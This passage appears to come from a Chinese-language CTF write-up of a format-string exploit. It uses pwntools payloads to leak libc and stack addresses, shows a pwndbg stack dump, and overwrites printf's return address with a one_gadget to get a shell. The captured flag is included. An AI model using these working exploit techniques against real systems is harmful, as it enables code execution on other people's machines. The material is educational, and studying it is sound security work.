
```python
# First payload: leaking libc address
payload1 = b'%73$016l' + b'lxKKKKKK'
conn.sendline(payload1)
recv = conn.recvuntil(b'KKKKKK')
recv = recv.strip(b'KKKKKK')
main_ret_addr = int(recv, 16)
__libc_start_main_addr = main_ret_addr + 0x30
libc_addr = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success("main_ret_addr => 0x{:016X}".format(main_ret_addr))
log.success("libc_addr     => 0x{:016X}".format(libc_addr))
conn.interactive()
```

运行结果如下：

![image-20240728234411166.png](https://s2.loli.net/2024/07/29/phyjcWksBP1intq.png)

获得 libc 地址为 `0x000079FB95A00000`

## Leaking stack address

由于栈之间的相对偏移应该不变，所以应该可以通过找到一个链：栈上一个位置 A ，其指向栈的另一个位置 B ，找到 A 、 B 其关于格式字符串的偏移位置。然后利用 `printf() %x` 向 B 的地址漏出来，因此就可以找出 rsp 的地址，最后就可以将 printf_ret_addr 改写成 one_gadget。

在一次动态调试中，我注意到了这样一个可以存在的链（注意红色字）：

<pre><font color="#C01C28"><b>pwndbg&gt; </b></font>x /110gx $rsp
<font color="#12488B">0x7fffffffd9c8</font>:	0x000055555555528d	0x654a6568546e7552
<font color="#12488B">0x7fffffffd9d8</font>:	0x0000000a736c6577	0x0000000000000000
<font color="#12488B"> < skipped > </font>
<font color="#12488B">0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
<font color="#12488B">0x7fffffffdbd8</font>:	0xdf6e9e6f3d379b00	0x0000000000000001
<font color="#12488B">0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color="#12488B">0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
<font color="#FF0000">0x7fffffffdc08</font>:	<font color="#FF0000">0x00007fffffffdcf8</font>	0x0000000000000000
<font color="#12488B">0x7fffffffdc18</font>:	0x8843981ffe157fda	0x00007fffffffdcf8
<font color="#12488B"> < skipped > </font>
<font color="#12488B">0x7fffffffdce8</font>:	0x000000000000001c	0x0000000000000001
<font color="#FF0000">0x7fffffffdcf8</font>:	0x00007fffffffe083	0x0000000000000000
<font color="#12488B">0x7fffffffdd08</font>:	0x00007fffffffe0a8	0x00007fffffffe0be
<font color="#12488B">0x7fffffffdd18</font>:	0x00007fffffffe0e7	0x00007fffffffe15b
<font color="#12488B">0x7fffffffdd28</font>:	0x00007fffffffe1b1	0x00007fffffffe1c2
<font color="#C01C28"><b>pwndbg&gt; </b></font>
</pre>

 `0x7fffffffdc08` 处的内存指向栈的另一处内存 `0x00007fffffffdcf8` ，而 rsp 指向 `0x7fffffffd9c8` ，所以 A 在栈中第 73 个位置，是相对格式字符串第 77 个参数，而 B 在栈中第 103 个位置， 相对 rsp 偏移值为 (103 - 1) * 8 = 0x330 。

编写如下 payload 获取 `printf()` 的返回地址：

```py
# Second payload : leaking stack address
payload2 = b'%77$016l' + b'lxKKKKKK'
conn.sendline(payload2)
recv2 = conn.recvuntil(b'KKKKKK')
recv2 = recv2.strip(b'KKKKKK')
arg_103_addr = int(recv2, 16)
printf_ret_addr = arg_103_addr - 0x330
log.success("arg_103_addr    => 0x{:016X}".format(arg_103_addr))
log.success("printf_ret_addr => 0x{:016X}".format(printf_ret_addr))
conn.interactive()
```

运行效果如下：

![image-20240729170544644.png](https://s2.loli.net/2024/07/29/pEO7SYrc8qwVimn.png)

获得 `printf()` 栈基址为 `0x00007FFF27F65378`

## Hijacking printf() return addr & getting system shell 

编写如下 payload 以执行 system call shell 并获取flag:

```python
# Third payload: getting system shell

one_gadget = 0xebc85 + libc_addr
payload3 = fmtstr_payload(6,{printf_ret_addr:one_gadget})
conn.sendline(payload3)
conn.interactive()
```

最终运行结果如下：

![image-20240729170928581.png](https://s2.loli.net/2024/07/29/Mv6dyTt4zFNbJ5a.png)

获得 flag 为 `AAA{3sc@pe_f3Om_wh1l3_1_i5_E4sy}`
